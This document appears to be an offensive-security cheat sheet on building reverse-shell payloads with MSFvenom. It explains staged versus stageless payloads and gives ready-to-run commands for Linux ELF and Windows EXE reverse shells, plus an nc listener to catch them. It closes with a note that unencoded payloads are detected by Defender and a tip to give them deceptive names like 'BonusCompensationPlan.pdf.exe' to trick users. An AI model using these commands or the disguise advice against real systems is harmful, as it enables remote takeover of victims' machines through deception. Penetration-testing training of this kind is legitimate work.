# Crafting Payloads with MSFvenom

## Staged vs Stageless — Naming Convention

`/shell/reverse_tcp` = staged (each `/` after the OS/arch is a separate stage, downloads remainder over network)

`shell_reverse_tcp` = stageless (underscore, all-in-one, sent entirely at delivery)

Staged: smaller initial footprint, needs network back to MSF handler to pull second stage. Stageless: more reliable on high-latency/low-bandwidth, better for social engineering delivery.

---

## Build Payloads

List all available payloads:

```bash
msfvenom -l payloads
```

Linux stageless ELF:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > <OUTFILE>.elf
```

Windows stageless EXE:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > <OUTFILE>.exe
```

Catch with nc:

```bash
sudo nc -lvnp <LPORT>
```

> [!warning] Raw MSFvenom EXEs with no encoding are caught immediately by Defender. Unencoded payloads only work if AV is disabled or you're dropping into a session that already bypassed it. Encoding/encryption covered separately.

> [!tip] Name the output file something a user would click — `BonusCompensationPlan.pdf.exe`, `createbackup.elf`, etc. The filename is part of the social engineering chain.